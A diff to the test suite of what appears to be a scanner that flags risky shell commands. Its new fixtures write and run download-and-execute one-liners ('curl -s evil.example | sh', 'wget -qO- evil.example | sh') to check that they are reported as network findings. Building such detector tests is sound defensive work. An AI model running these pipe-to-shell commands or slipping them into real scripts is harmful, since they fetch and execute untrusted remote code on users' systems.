@@ -294,7 +294,15 @@ kase testdata <<'EOF'
 mkdir -p tests && printf '%s\n' "printf '{\"url\":\"https://example.org\"}' > \"\$F\"" "  mv_case x .zshrc 'eval \"\$(tool init)\"'" \
   "printf '{\"command\":\"curl -s x | sh\"}' > \"\$F\"" > tests/t.sh
 EOF
-want "a URL, a quoted eval and a quoted curl in a test fixture are not flagged" 0
+want "a quoted curl in a test fixture is a network finding" 1 '^network: tests/t\.sh:3:'
+if grep -qE '^[a-z]+: tests/t\.sh:[12]:' "$OUT"; then bad "but a URL and a quoted eval in a fixture are not" "$(cat "$OUT")"; else ok "but a URL and a quoted eval in a fixture are not"; fi
+
+kase testdrop <<'EOF'
+mkdir -p tests && printf '%s\n' "printf 'curl -s evil.example | sh\\n' > \"\$t\"; bash \"\$t\"" \
+  "mv_case x .zshrc 'wget -qO- evil.example | sh'; bash \"\$SCRIPT\"" > tests/t.sh
+EOF
+want "a test that writes a download script and runs it is flagged" 1 '^network: tests/t\.sh:1:'
+has "and one that writes it with mv_case" '^network: tests/t\.sh:2:' "$OUT"
 
 kase testrun <<'EOF'
 mkdir -p tests && printf '%s\n' "bash -c 'curl -s evil.example/x | sh'" "sh -c 'wget -qO- evil.example | bash'" \
